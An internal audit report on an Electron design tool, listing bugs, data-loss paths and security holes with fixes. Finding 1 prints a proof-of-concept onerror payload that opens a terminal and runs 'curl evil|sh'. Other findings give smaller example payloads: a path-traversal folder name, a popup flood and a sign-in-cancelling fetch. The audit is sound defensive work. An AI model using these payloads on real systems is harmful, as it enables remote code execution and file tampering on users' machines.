# Repo audit, 2026-11-10

A read-only audit of the whole repo, in priority order. Load assumed: one
person per desktop, often with an AI agent editing the same files at the
same time.

How each finding was checked:
- The Must fix findings were re-read in the code.
- The parser findings (6, 16, 21, 22) were reproduced by running real CSS
  through `parseCode` and `generateCode`.
- The monorepo Discard failure (9) was reproduced with real git in a
  scratch repo.
- Everything else was traced through the code, not run.

Line numbers are for the `.ts` sources as of `fcff3db3`.

## Contents

- [Must fix](#must-fix): bugs, security holes, and data loss.
- [Should fix](#should-fix): real failures that need a particular
  situation to happen.
- [Lean](#lean): code and dependencies that can go.
- [Nice to have](#nice-to-have): low-impact problems.
- [Not checked](#not-checked): what this audit didn't cover.

---

## Must fix

### 1. Opening a project you didn't make can run shell commands

- [x] `src/renderer/src/canvas/IframeCanvas.tsx:502`

**What happens:**
- The canvas iframe has no `sandbox` attribute, so it shares an origin with
  the app.
- Unknown attributes, `onerror="…"` among them, survive parsing:
  - `parseCode/tsx.ts:822` keeps them.
  - `generateHtml.ts:313` passes them through, because `isEditorAttribute`
    drops only `data-scamp-*`.
  - Raw markup fragments pass through too (`generateHtml.ts:480`).
- There's no CSP anywhere.

**Why it matters:** script in the iframe can reach `parent.scamp`, which
includes `createTerminal` and `writeTerminal` (`src/preload/index.ts:558-562`).

**Example:** a cloned project, or one an agent edited, contains:

```tsx
<img data-scamp-id="img_a1b2" className={styles.img_a1b2} src="x"
     onerror="parent.scamp.getStartScreenProjects().then(p=>parent.scamp.createTerminal({cwd:p[0].path,cols:80,rows:24})).then(t=>parent.scamp.writeTerminal({id:t.id,data:'curl evil|sh\r'}))">
```

As soon as the canvas draws the page, the image fails to load and the shell
command runs. The user doesn't click anything.

**Fix:**
- Add `sandbox="allow-same-origin"`, without `allow-scripts`, to the iframe.
  The app can still read and change the iframe's page, but nothing inside it
  can run.
- Before merging, check the canvas by hand. Its listeners are attached from
  the app window, so it should still work, but nobody has confirmed that.
- Stripping `on*` attributes isn't enough on its own: `javascript:` links,
  `<iframe srcdoc>` and SVG `<script>` would still get through.

### 2. Discard deletes your own uncommitted work

- [x] `src/main/embedded/git.ts:191-205`, called from
  `src/main/embedded/window.ts:580`

**What happens:**
- `discardFiles` resets every touched tracked file to `HEAD`, and runs
  `fs.rm` on every touched untracked file.
- Preflight lets you start with uncommitted changes (`preflight.ts`: "Your
  uncommitted changes come with you").

**Examples:**
- You have an untracked `Card.module.css` and haven't committed it. A
  fast-path style edit writes to it. Discard then deletes the whole file,
  and git can't bring it back.
- You edited a tracked file by hand before the session. Discard wipes those
  edits along with the agent's.
- Accept has the mirror problem: it commits your own changes in a shared
  file.

**Fix:**
- Discard by writing back each recorded run's `before` content, newest
  first. `session.runs` already holds it; `runs.ts` does the same swap for
  undo.
- Fall back to `restore` and `rm` only for files that were clean when the
  session started.

### 3. Deleting or renaming a component erases its whole folder

- [x] `src/main/ipc/componentOps.ts:240`: `fs.rm(componentDir, { recursive: true, force: true })`
- [x] `src/main/ipc/componentOps.ts:168`: `removeViewWrapper`, which runs
  `fs.rm(pageDir, { recursive: true })`

**What happens:** a rename (`useComponentManagement.ts:419`) creates the new
component with only its TSX and CSS, then deletes the old folder.

**Examples:**
- Renaming `Button` deletes the `Button.test.tsx` or `Button.stories.tsx`
  an agent added.
- Deleting the view `About` deletes `app/about/layout.tsx` and
  `app/about/team/page.tsx`.
- Snapshots don't help: they copy only Scamp's own files
  (`snapshotOps.ts:227-258`).

**Fix:** do what `deletePage` already does (`pageOps.ts:127-138`): remove
Scamp's two files, then `rmdir` the folder only if it's empty.

### 4. A page-folder name from the app window isn't checked and can point outside the project

- [x] `src/main/ipc/componentOps.ts:84-90`, `:123`, `:146-148`
- [x] `src/main/ipc/component.ts:70-83` (thumbnails)

**What happens:**
- `component.ts:33` checks only `projectPath`. `wrapperSlug` is joined into
  the path as it arrives.
- The two thumbnail handlers skip `assertInsideActiveProject`.

**Example:** `{ kind: 'view', wrapperSlug: '../../../Documents/site',
replacePage: true }` writes `~/Documents/site/page.tsx` and deletes
`~/Documents/site/page.module.css`. With finding 1, a project file can do
this.

**Fix:**
- Reject any `wrapperSlug` that doesn't match `/^[a-zA-Z0-9-]+$/`.
- Add `assertInsideActiveProject` to `ComponentWriteThumbnail` and
  `ComponentReadThumbnail`.

### 5. Quitting while sync is paused loses your canvas edits

- [x] `src/renderer/src/syncBridge.ts:213`

**What happens:**
- `handleBeforeUnload` calls `flushDebouncedWrite()`, and `evenIfPaused`
  defaults to `false` (`quietReconcile.ts:23`).
- `writeIfDirty` then skips the write while sync is paused, or within 2.5
  seconds of an agent edit (`writeIfDirty.ts:271-285`).
- Switching pages and closing a project already pass `evenIfPaused=true`.

**Example:** you pause sync, keep designing, and press Cmd+Q. Every edit
since the pause is gone.

**Fix:** `ctx.flushDebouncedWrite(true)`.

### 6. A second CSS block for the same class erases the first

- [x] `src/renderer/lib/parseCode/css.ts:477`: `byClass.set(className, decls)`
- [x] `src/renderer/lib/parseCode/css.ts:482`: the state blocks
- [x] `src/renderer/lib/parseCode/css.ts:564`: the breakpoint blocks

**What happens:** each `set` replaces the class's earlier declarations
instead of adding to them.

**Example:** an agent appends a block:

```css
.rect_a1b2 { color: red; width: 100px; height: 100vh }
.rect_a1b2 { background: blue }
```

The next save writes `.rect_a1b2 { background: blue; position: static; }`.
The color, width and height are gone from disk. No test covers this.

**Fix:**
- `byClass.set(c, [...(byClass.get(c) ?? []), ...decls])`, and the same for
  the state and breakpoint buckets.
- The existing handling of duplicate properties already keeps the last one,
  as CSS does.
- Add a regression test.

### 7. Migrating an old project overwrites files it says it left in place

- [x] `src/main/ipc/projectMigrate.ts:250-256`, `:279-282` (old format to
  Next.js)
- [x] `src/main/ipc/projectMigrate.ts:486-492` (Next.js to Scamp)

**What happens:** the migration renames its staged `package.json`,
`next.config.ts`, `public/` and `app/` over whatever is already in the
root.

**Examples:**
- On POSIX systems, `rename` replaces your own `package.json`. That file
  isn't in the backup, yet the UI lists it as left in place.
- A non-empty `app/` or `public/` makes the rename fail with `ENOTEMPTY`,
  after your pages were already moved to the backup. The project is left
  half migrated.
- An existing non-empty `routes/` or `design/` does the same during the
  Next.js to Scamp migration.

**Fix:** before moving anything, either move each existing top-level name
into the backup, or refuse to migrate.

### 8. Two agent runs can start at once, and Stop then does nothing

- [x] `src/main/embedded/agentQueue.ts:131-139`

**What happens:** `run()` checks `running`, then awaits
`deps.getProvider()`, and only then sets `running = true`.

**Example:**
1. The batch timer fires, and its run starts waiting for the provider.
2. You click **Run now**, which is still enabled, and a second run starts.
3. The second run finishes first and clears `abort`, so **Stop** no longer
   stops the first.
4. With `running` now false, the next edit you queue can start a third run.

**Fix:** set `running = true` before the `await`, and reset it on the early
return.

### 9. Embedded Scamp's git features break when the project is a subfolder of a repo

- [x] `src/main/embedded/git.ts:168` (`gitDiff`)
- [x] `src/main/embedded/git.ts:193-202` (`discardFiles`)
- [x] `src/main/embedded/window.ts:629` (undo)

**What happens:** `git status --porcelain=v1` gives paths from the repo's
top folder, but every git call runs from the project folder and treats the
paths as project-relative. `ownAgent.ts:80` already handles this with
`--show-toplevel`; `git.ts` doesn't.

**Example:** with the project at `repo/apps/web`:
- Discard fails with "pathspec did not match". This was reproduced.
- New files aren't deleted, yet Discard reports success.
- New files are missing from the diff.
- Undo clears paths that are still changed, so Accept leaves them out.

**Fix:** ~~add `--relative` to the `status` calls~~. `git status` has no `--relative` option, so `inProject` in `git.ts` strips `git rev-parse --show-prefix` from each path instead.

### 10. Curly braces in text break the page

- [ ] `src/renderer/lib/generateCode/internal.ts:38` (`escapeJsx`), used at
  `:61` and in `generateCode/tsx.ts:354`, `:359` and `:371`

**What happens:** `escapeJsx` escapes `<`, `>` and `"`, but not `{` or `}`.

**Examples:**
- The text `Use {name} } here` becomes a JSX expression, so the page fails
  to build.
- The text `{fetch('…')}` runs when you preview the page.
- The parser reads the text back unchanged, so round-trip tests don't
  notice.

**Not fixed: the suggested fix is wrong.** The parser keeps agent-written
JSX text, `{count}` included, as plain text in the model
(`parseCode/tsx.ts` `ontext`). Escaping braces on output would turn a
working `{count} items` into the literal characters. A real fix has to
tell typed text from parsed JSX: for example, escape braces when the user
commits a text edit on the canvas, not in the generator.

---

## Should fix

### 11. The agent's conversation grows until every run fails

- [x] `src/main/embedded/agentQueue.ts:96`, `:183` (`history = result.history`)

**What happens:** each batch sends all earlier turns again, including whole
files the agent read (up to 400 KB each). Nothing resets the history, not
even Accept or Discard.

**Example:** after about 8–10 batches on a large component, the prompt no
longer fits in the context window. Every run then errors until you restart
the app. Cost also grows faster with each batch.

**Fix:** set `history = []` on Accept and Discard.

### 12. Undo during a run brings an undone change back

- [x] `src/main/embedded/window.ts:602-633` (`EmbeddedUndoRun`, `EmbeddedHistoryGoTo`)

**What happens:** neither handler checks whether an agent run is in
progress.

**Example:**
1. Run A changes file X.
2. Run B starts, and its snapshot records X as A left it.
3. You undo A while B is still thinking.
4. B ends without touching X, but `recordRun` sees X changed and records
   your undo as B's change.
5. When you undo B, A's change comes back.

**Fix:** refuse both while the phase is `thinking` or `writing`, or while
`heldBatch() !== null`.

### 13. An agent edit right after a Scamp save is taken for Scamp's own write

- [x] `src/main/watcher.ts:154-155`
- [x] `src/main/pendingWrites.ts:70-77`
- [x] `src/main/ipc/file.ts:45-46`

**What happens:**
- When Scamp writes a file, it skips the next change event for that file,
  matching by file name only.
- chokidar's `awaitWriteFinish` merges changes made within 200 ms into one
  event.

**Example:** an agent writes the same file about 100 ms after Scamp saves
it.
- The merged event is skipped as Scamp's own.
- The canvas keeps stale styles, no snapshot is taken, and the quiet window
  doesn't open.
- The next save can overwrite the agent's work.

There's also a gap between the conflict check (`file.ts:36`) and the rename
(`fileOps.ts:55`): an agent write that lands in it is overwritten, and its
event is skipped too.

**Fix:** store a hash of what Scamp wrote, and skip the event only when the
file on disk still matches it.

**Done:** the tracker keeps what Scamp wrote, and the watcher skips the
event only when the file still holds it. The gap between the conflict
check and the rename is still open.

### 14. Embedded Scamp's file paths follow symlinks out of the project

- [x] `src/main/embedded/window.ts:300-306` (`readProjectFile`), `:414` (the
  write)
- [x] `src/main/embedded/fileTools.ts:34-48` (`staysInside`)

**What happens:**
- The fast path checks the path only as text.
- `staysInside` moves up to the parent folder when `realpath` fails, so a
  broken symlink passes.

**Examples:**
- `src/styles` links to `../../packages/ui/styles`. A style edit writes into
  `packages/ui`, where git, Discard and undo can't see it.
- The same unchecked read serves page-supplied `source` paths to
  `readSource`, `contentOrigin` and `listOrigin`.
- `src/gen.ts` links to a missing file outside the project. `write_file`
  creates that file.

**Fix:**
- Export `staysInside`, and use it in `readProjectFile` and before the write.
- In `staysInside`, `lstat` first and refuse symlinks.

**Done:** `staysInside` refuses a dangling symlink only; a symlink whose
target is inside the project still works.

### 15. Closing the Embedded Scamp window leaves its shells running

- [x] `src/main/embedded/window.ts:277-282`
- [x] `src/main/ipc/terminal.ts:21`, `:85`
- [x] `src/main/index.ts:214-221`

**What happens:** `Term.owner` is recorded but never used. A window's
cleanup code doesn't run when the window closes.

**Example:**
- Closing the Embedded Scamp window leaves its shell running, along with
  `npm run dev` or an agent it started.
- After three closes, `MAX_TERMINALS = 3` is reached, and no window can open
  a terminal.
- In the other direction, reloading the main window runs
  `disposeAllTerminals()`, which kills the Embedded Scamp window's live
  shells.

**Fix:**
- Store `ownerId = e.sender.id` on each terminal, and add a function that
  kills only one owner's terminals.
- Call it from the Embedded Scamp window's `closed` handler, and from the
  main window's `did-start-navigation` in place of `disposeAllTerminals`.

### 16. The CSS parser quietly changes some valid values

Each case was reproduced, and none has a test.

- [x] **Times with a leading dot become 0.**
  - **Where:** `src/renderer/lib/parsers/internal.ts:35`.
  - **Example:** `transition: opacity .3s ease` saves as
    `transition: opacity 0ms ease`.
  - **Fix:** `/^(-?(?:\d+(?:\.\d+)?|\.\d+))(ms|s)$/i`.
- [x] **`background` and `background-color` map to one field.**
  - **Where:** `src/renderer/lib/cssPropertyMap.ts:81-82`.
  - **Example:** `background: url(a.png) center / cover no-repeat;
    background-color: #eee;` saves as `background: #eee;`, and the image is
    lost.
  - **Fix:** the `background` mapper returns `null` for anything that isn't
    a single color.
  - **Done differently:** an image in `background` alone already round-trips
    through the color field, and the legacy canvas draws it from there. Only
    the pair is kept as written (`keepAsWritten` in `parseCode/apply.ts`).
- [x] **`!important` is dropped.**
  - **Where:** `src/renderer/lib/parseCode/css.ts:103`.
  - **Example:** `color: red !important;` saves as `color: red;`.
  - **Fix:** ``value: child.important ? `${child.value} !important` : child.value``.
    The typed mappers don't all refuse it, so `parseCode/apply.ts` keeps any
    `!important` value as written.
- [ ] **Comments inside a rule, and between rules, are dropped.** Not fixed: the element model has no place to keep a comment, so this needs a model field and generator support.
  - **Where:** `src/renderer/lib/parseCode/css.ts:83-98`.
  - **Example:** `/* keep me */` inside a rule disappears on the next save.
  - **Fix:** keep the comment nodes along with the declarations.
- [x] **The `border` mapper never refuses a value.**
  - **Where:** `src/renderer/lib/cssPropertyMap.ts:218-224` and
    `src/renderer/lib/parsers/border.ts:68-80`.
  - **Examples:**
    - `border: thin solid red` saves as `border-width: 0px;
      border-style: solid; border-color: thin`.
    - `border: 0.1rem solid red` fails the same way.
    - `double` becomes `solid`.
  - **Fix:** return `null` unless every part was read cleanly: a px width,
    one of the four supported styles, and at most one color.

---

## Lean

### 17. About 1,178 committed generated `.js` files ship instead of the source

- [ ] `tsconfig.web.json`, `tsconfig.node.json`

**What happens:**
- Both tsconfigs are `composite` with no `outDir`. `tsc --build` therefore
  writes `.js` and `.d.ts` files next to the sources: 2,361 files, about
  172k lines.
- Vite and Vitest load `.js` before `.ts`, so `electron-vite build`
  (`release.yml:135`) and the tests use these copies.
- CI never regenerates them.

**Example:** you edit a `.ts` file and forget to regenerate. The old code
ships and is tested, and CI still passes. The "never regenerate while the
dev server runs" rule exists only because of these files.

**Fix:**
- Add `"outDir": "node_modules/.tsbuild/<web|node>"` to both tsconfigs.
- `git rm` the generated files. Keep the hand-written `global.d.ts` and
  `css-modules.d.ts`.
- Remove the `shims*` npm scripts and the shim section of CLAUDE.md.

Orphaned generated files that have no source, which you can delete today
(57 lines):
- `src/renderer/src/components/ImageImportIndicator.{js,d.ts}`
- `test/e2e/properties-panel/__dup.spec.{js,d.ts}`
- `test/e2e/properties-panel/__nesting.spec.{js,d.ts}`

### 18. The legacy canvas has outlived its one release

- [ ] `src/renderer/src/canvas/ElementRenderer.tsx` (1,347 lines)

**What happens:** the iframe canvas became the default in commit
`309aba08` and shipped in 0.13.0 and 0.14.0. The legacy canvas is reachable
only through devtools (`__scampIframeCanvas.set(false)`) or
`SCAMP_E2E_LEGACY_CANVAS=1`.

**Delete:**
- `ElementRenderer.tsx`
- `src/renderer/lib/elementToStyle.ts` (517 lines)
- `src/renderer/lib/instanceStretch.ts` (67 lines)
- `src/renderer/src/lib/inlineMarkup.ts` (44 lines)
- `CanvasPageStylesheet`
- The `!iframeFlag` branches in `Viewport.tsx:581-589` and
  `VariantSet.tsx:142-151`
- Their tests: `elementToStyle.test.ts`, `positionOffsets.test.ts` and
  `instanceStretch.test.ts` (798 lines)

**Keep:**
- `ElementRenderer.module.css`, which `exportCapture.ts:4` imports.
- `variantFrame.ts`, which `VariantSet` also uses.

### 19. `patch-package` runs on every install and does nothing

- [ ] `package.json:16`

**What happens:** there's no `patches/` folder, so the tool has nothing to
apply.

**Fix:** remove the dev dependency, and change `postinstall` to
`electron-rebuild -f -w node-pty`.

---

## Nice to have

### 20. The import window lets any site open endless browser tabs

- [ ] `src/main/importWindow.ts:97-104`

**What happens:** popups go straight to `shell.openExternal`, with no check
that you clicked something. The preview window has that check
(`previewWindow.ts:149-156`).

**Example:** `setInterval(() => window.open('https://ads.example'), 200)`
opens five browser tabs a second.

**Fix:** copy the preview window's gate: create a popup gate, call
`gate.noteInput` on `input-event`, and require `gate.allow()`.

### 21. A routed `@media` block drops its other rules and flattens nested at-rules

- [ ] `src/renderer/lib/parseCode/css.ts:541-565`

**What happens:** `walkRules` goes into nested at-rules, and rules that
aren't for one of Scamp's classes are ignored.

**Example:** in `@media (max-width: 768px) { body { margin: 0 } … @supports
(display: grid) { .text_c3d4 { font-size: 20px } } }`:
- The `body` rule is deleted.
- The `@supports` condition is lost, so `font-size: 20px` becomes a plain
  tablet override.

**Fix:** treat the block as non-base when a rule has no class
(`c === null`) or is nested (`rule.parent !== node`), so the whole block is
kept as written.

### 22. A `data-scamp-id` that isn't hex produces broken TSX

- [ ] `src/renderer/lib/parseCode/tsx.ts:781-786`

**Example:** `data-scamp-id="hero-card"` generates
`className={styles.rect_hero-card}`, which JavaScript reads as a
subtraction. The element ends up unstyled.

**Fix:**
- If the short ID doesn't match `^[A-Za-z0-9]+$`, give it a new one through
  the existing `freshHexId` / `claimId` repair path.
- That block also repeats `shortId()` (`:413`) inline instead of calling
  it.

### 23. Renaming a Next.js page can overwrite an agent's edit to another page

- [ ] `src/main/ipc/pageRename.ts:104-111`

**What happens:** the rename reads every page first, then rewrites their
`href`s one at a time with plain `fs.writeFile`, skipping the change
events.

**Example:** an agent edits `app/contact/page.tsx` while the loop runs. The
edit is overwritten, with no reload and no snapshot.

**Fix:** re-read each page right before writing it, skip any page that
changed, and write through `atomicWrite`.

### 24. `flex: 1` is dropped when the parent is flex only at a breakpoint

- [ ] `src/renderer/lib/generateCode/declarations.ts:359`

**What happens:** the flex-item longhands are written only when the parent
is flex in the base styles (`parentDisplay === 'flex'`).

**Example:** a parent is flex only at tablet width. The child's `flex: 1`
is lost on save.

**Fix:** also write the longhands when the parent is flex at any
breakpoint.

### 25. Any web page can cancel a sign-in in progress

- [ ] `src/main/auth/loopbackServer.ts:88-103`
- [ ] `src/main/auth/authService.ts:114-117`

**What happens:** the first request to `/callback` ends the sign-in,
whatever it contains.

**Example:** while you sign in, a browser tab sends
`fetch('http://localhost:8976/callback', { mode: 'no-cors' })`. Sign-in
fails with "did not match", and the real redirect then finds no listener.
PKCE still stops an account takeover; this only blocks sign-in.

**Fix:** end the sign-in only when the `state` matches or `error=` is
present. Answer anything else with 400 and keep listening.

### 26. Imported sites can read your installed fonts without asking

- [ ] `src/main/index.ts:304-311`

**What happens:** `local-fonts` is granted on the default session. The
import `<webview>` has no partition (`ImportApp.tsx:530-537`), so it uses
that session too.

**Example:** any site loaded in the importer calls `queryLocalFonts()` and
gets your full font list, which is useful for fingerprinting.

**Fix:** grant the permission only when `webContents.getType() !== 'webview'`.

### 27. Overlapping project opens can leave an MCP server that nothing stops

- [ ] `src/main/mcp/lifecycle.ts:44-59`, called from `src/main/ipc/project.ts:186`, `:252`

**What happens:** `startMcpForProject` stops the old server, then awaits the
new start without a lock.

**Example:** two opens arrive close together. Two servers start, and the
second overwrites `running`. The first keeps listening until the app quits.
Not confirmed that the start screen can send two opens this close together.

**Fix:** chain the calls through one promise, or close the new server when a
later call has started.

### 28. Choosing an image creates any folder it's given

- [ ] `src/main/ipc/image.ts:34-35`

**What happens:** `FileChooseImage` runs `mkdir -p` on whatever
`defaultPath` the app window sends.

**Fix:** check `defaultPath` with `assertInsideActiveProject` first.

---

## Not checked

- **Not run:** the app, the full Vitest suite, and the e2e specs. Nothing
  was checked end to end.
- **Read only in part:**
  - Most of the renderer: the stores, components, and the sync bridge's
    merge and write files.
  - `src/shared/captureScript.ts` and the import pipeline.
  - The other parsers (`animation`, `boxShadow`, `color`, `filter`, `flex`,
    `padding`, `size`, `transform`).
- **Not read:**
  - `src/main/agent`, `src/main/reactImport`, `src/main/devServer`.
  - Many smaller IPC handlers.
  - In `src/main/embedded/`: `content.ts`, `listOrigin.ts`, `projectFiles.ts`,
    `idiom.ts`, `pseudo.ts`, `recent.ts`, `routes.ts`.
- **Open question:** the page talks to Embedded Scamp through `console.debug`
  lines with a fixed prefix (`src/shared/embedded.ts:505`), so any script on
  the page can fake them. Main checks only `typeof item.id` when an edit is
  queued (`window.ts:540`). Nobody traced whether a fake line can queue an
  edit without you doing anything.
